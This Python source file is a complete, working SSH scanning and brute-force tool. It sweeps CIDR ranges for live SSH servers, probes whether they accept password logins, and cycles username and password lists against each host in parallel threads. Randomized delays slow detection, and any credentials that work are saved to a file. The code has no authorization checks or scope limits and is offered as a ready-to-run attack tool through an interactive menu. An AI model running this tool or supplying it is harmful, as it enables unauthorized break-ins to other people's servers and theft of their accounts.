import socket
import paramiko
import time
import random
import datetime
import asyncio
from tqdm.asyncio import tqdm_asyncio
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
import os
from ipaddress import IPv4Network

logging.basicConfig(
    filename='ssher.log',
    level=logging.INFO,
    format='%(asctime)s | %(levelname)s | %(message)s'
)
logging.info("Async SSH scanner & brute-force tester started")

# Files
user_file = os.path.join(os.path.dirname(__file__), 'user.txt')
pass_file = os.path.join(os.path.dirname(__file__), 'password.txt')
SUCCESS_FILE = "successful_logins.txt"
LIVE_HOSTS_FILE = "live_hosts.txt"

if not all(os.path.exists(f) for f in [user_file, pass_file]):
    print("[-] Missing credential files")
    exit(1)

with open(user_file) as f: usernames = [l.strip() for l in f if l.strip()]
with open(pass_file) as f: passwords = [l.strip() for l in f if l.strip()]

print(f"[+] Loaded {len(usernames)} users / {len(passwords)} passwords")

def log_success(target: str, user: str, pwd: str):
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = f"[{ts}] {target:15}  {user:12}  {pwd}\n"
    with open(SUCCESS_FILE, 'a', encoding='utf-8') as f:
        f.write(entry)
    print(f"   → Logged: {target} {user}:{pwd}")

async def check_ip_async(ip_str: str, port: int = 22, timeout: float = 0.6) -> str | None:
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(ip_str, port),
            timeout=timeout
        )
        banner = await asyncio.wait_for(reader.read(512), timeout=timeout)
        writer.close()
        await writer.wait_closed()
        if banner.decode('utf-8', errors='ignore').strip().startswith('SSH-'):
            return ip_str
    except (asyncio.TimeoutError, OSError, ConnectionRefusedError, asyncio.IncompleteReadError):
        pass
    return None

async def scan_cidr_async(cidr: str, max_concurrent: int = 80, port: int = 22):
    print(f"\n[+] Async scanning {cidr} (max concurrent: {max_concurrent}, port: {port})")
    network = IPv4Network(cidr, strict=False)
    ips = [str(ip) for ip in network]

    live = []
    semaphore = asyncio.Semaphore(max_concurrent)

    async def limited_check(ip):
        async with semaphore:
            return await check_ip_async(ip, port=port)

    tasks = [limited_check(ip) for ip in ips]

    for coro in tqdm_asyncio.as_completed(tasks, total=len(ips), desc="Scanning"):
        result = await coro
        if result:
            print(f"\n[+] LIVE → {result}")
            live.append(result)

    if live:
        with open(LIVE_HOSTS_FILE, 'a') as f:
            f.write("\n".join(live) + "\n")
        print(f"[+] Saved {len(live)} live hosts to {LIVE_HOSTS_FILE}")

    print(f"\n[+] Async scan complete. Found {len(live)} live SSH servers.")
    return live

def probe_auth_methods(host: str, port: int = 22, timeout: int = 5) -> bool:
    """
    Probe if password auth is possible by attempting a real user with dummy pass.
    Returns True if password seems allowed (rejection after password send).
    """
    test_user = "root" if "root" in [u.lower() for u in usernames] else usernames[0] if usernames else "admin"
    test_pass = "dummyprobe123"

    print(f"[PROBE] Testing auth methods on {host}:{port} with user '{test_user}'")

    try:
        c = paramiko.SSHClient()
        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        c.connect(
            host,
            username=test_user,
            password=test_pass,
            port=port,
            timeout=timeout,
            allow_agent=False,
            look_for_keys=False,
        )
        # Should never reach success
        c.close()
        print(f"[PROBE] Unexpected success on {host} — allowing")
        return True
    except paramiko.AuthenticationException as e:
        err = str(e).lower()
        print(f"[PROBE] Auth exception: {err[:100]}")

        # Positive signs password is allowed
        if any(x in err for x in ['authentication failed', 'permission denied', 'invalid credentials']):
            print(f"[PROBE] {host} allows password auth (rejected after password)")
            return True

        # Negative: explicit pubkey-only or bad type
        if 'bad authentication type' in err or 'publickey' in err and 'password' not in err:
            print(f"[PROBE] {host} pubkey-only or no password — skipping")
            return False

        # Unknown — assume allowed to be safe (or log and skip)
        print(f"[PROBE] Unknown rejection on {host} — assuming password allowed")
        return True
    except paramiko.SSHException as e:
        print(f"[PROBE] SSH error on {host}: {str(e)}")
        return False
    except Exception as e:
        print(f"[PROBE] Connection failed on {host}: {str(e)}")
        return False

def try_login(host: str, user: str, pwd: str, port: int = 22) -> tuple[bool, str]:
    print(f"[TRY] {host:15}  {user}:{pwd}")
    try:
        c = paramiko.SSHClient()
        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        c.connect(
            host,
            username=user,
            password=pwd,
            port=port,
            timeout=8,
            allow_agent=False,
            look_for_keys=False,
        )
        print(f"[HIT] {host:15}  {user}:{pwd}")
        log_success(host, user, pwd)
        c.close()
        return True, "success"
    except paramiko.AuthenticationException as e:
        err_str = str(e)
        print(f"[FAIL AUTH] {host:15}  {user}:{pwd}  ({err_str[:80]})")
        return False, "auth_fail"
    except paramiko.SSHException as e:
        print(f"[SSH ERROR] {host:15}  {user}:{pwd}  ({str(e)[:80]})")
        return False, "ssh_error"
    except socket.timeout:
        print(f"[TIMEOUT] {host:15}  {user}:{pwd}")
        return False, "timeout"
    except Exception as e:
        print(f"[UNEXPECTED] {host:15}  {user}:{pwd}  ({type(e).__name__}: {str(e)[:80]})")
        return False, "error"

def brute_one_host(target: str, port: int = 22):
    print(f"\n→ {target}")

    # Probe (optional — keep if you want early skip on pubkey-only)
    if not probe_auth_methods(target, port=port):
        print(f"[SKIP] {target} — no password authentication allowed")
        return False

    streak = 0
    found_hit = False

    for user in usernames:
        if found_hit or streak >= 3:
            break

        for pwd in passwords:
            if found_hit:
                break

            hit, reason = try_login(target, user, pwd, port=port)

            if hit:
                found_hit = True
                streak = 0
                print(f"[+] Hit found on {target} — stopping for this host")
                break

            # ONLY increment streak on connection problems
            if reason in ("ssh_error", "timeout", "banner_error"):
                streak += 1
                print(f"   → Streak {streak}/3 (connection issue)")
                if streak >= 3:
                    print(f"[SKIP] {target} — too many connection failures")
                    break
            else:
                # Wrong password / auth fail → RESET streak, keep going
                streak = 0

            time.sleep(1.2 + random.uniform(0, 2.4))

    return found_hit

def brute_force_hosts(live_hosts: list[str], port: int = 22, max_workers: int = 10):
    print(f"\n[+] Multi-threaded brute-force on {len(live_hosts)} hosts (port: {port}, workers: {max_workers})...")
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(brute_one_host, host, port=port): host for host in live_hosts}
        for future in as_completed(futures):
            host = futures[future]
            try:
                result = future.result()
                if result:
                    print(f"[+] Completed {host} (hit found)")
                else:
                    print(f"[+] Completed {host} (no hit or skipped)")
            except Exception as e:
                print(f"[-] Error on {host}: {str(e)}")

def load_hosts_from_file(file_path: str = LIVE_HOSTS_FILE) -> list[str]:
    if not os.path.exists(file_path):
        print(f"[-] Hosts file not found: {file_path}")
        return []
    with open(file_path, 'r') as f:
        hosts = [l.strip() for l in f if l.strip() and not l.startswith('#')]
    print(f"[+] Loaded {len(hosts)} hosts from {file_path}")
    return hosts

# ────────────────────────────────────────────────
# Interactive Menu
# ────────────────────────────────────────────────

def main_menu():
    print("\n" + "="*50)
    print("Async SSH Brute-Force Tool - Mode Selection")
    print("="*50)
    print("1. Async scan & brute (CIDR range)")
    print("2. Brute single server (one IP/hostname)")
    print("3. Async scan only (save to file)")
    print("4. Brute from file (load hosts from live_hosts.txt)")
    print("5. Quit")
    print("="*50)
    choice = input("Enter mode (1-5): ").strip()
    return choice

def run_mode(choice: str, threads: int):
    port_input = input("Enter target port (default 22): ").strip()
    port = int(port_input) if port_input else 22

    if choice == "1":
        cidr = input("Enter CIDR range (e.g. 192.168.1.0/24): ").strip()
        max_con = int(input("Max concurrent for scan (50–150 recommended): ").strip() or 80)
        live_hosts = asyncio.run(scan_cidr_async(cidr, max_concurrent=max_con, port=port))
        brute_force_hosts(live_hosts, port=port, max_workers=threads)
    elif choice == "2":
        host = input("Enter single IP/hostname: ").strip()
        brute_force_hosts([host], port=port, max_workers=threads)
    elif choice == "3":
        cidr = input("Enter CIDR range (e.g. 192.168.1.0/24): ").strip()
        max_con = int(input("Max concurrent for scan (50–150 recommended): ").strip() or 80)
        asyncio.run(scan_cidr_async(cidr, max_concurrent=max_con, port=port))
    elif choice == "4":
        file_path = input(f"Enter hosts file (default {LIVE_HOSTS_FILE}): ").strip() or LIVE_HOSTS_FILE
        live_hosts = load_hosts_from_file(file_path)
        brute_force_hosts(live_hosts, port=port, max_workers=threads)
    elif choice == "5":
        print("Exiting...")
        exit(0)
    else:
        print("Invalid choice — try again.")

if __name__ == "__main__":
    threads = int(input("Enter number of brute threads (default 10): ").strip() or 10)
    while True:
        choice = main_menu()
        run_mode(choice, threads)
        again = input("\nRun another mode? (y/n): ").strip().lower()
        if again != 'y':
            break

print(f"\nDone. Hits saved → {os.path.abspath(SUCCESS_FILE)}")